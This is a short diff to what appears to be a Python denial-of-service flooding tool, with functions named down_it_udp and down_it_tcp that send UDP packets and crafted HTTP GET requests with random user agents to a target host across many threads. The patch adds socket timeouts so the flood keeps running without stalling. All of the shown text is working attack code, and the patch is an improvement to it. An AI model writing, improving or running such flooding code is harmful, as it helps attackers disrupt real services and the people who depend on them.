@@ -60,6 +60,7 @@ def down_it_udp():
             + "\n" + data
             + "\n\n" + extra_data).encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(5)
         p = int(port) if port else get_random_port()
         try:
             s.sendto(packet, (host, p))
@@ -117,6 +118,7 @@ def down_it_tcp():
                 "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
                 'utf-8')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
@@ -244,6 +246,8 @@ if __name__ == '__main__':
     user_agent()
     headers()
     time.sleep(5)
+
+    socket.setdefaulttimeout(5)
 
     thrs = []
     for i in range(int(thr)):
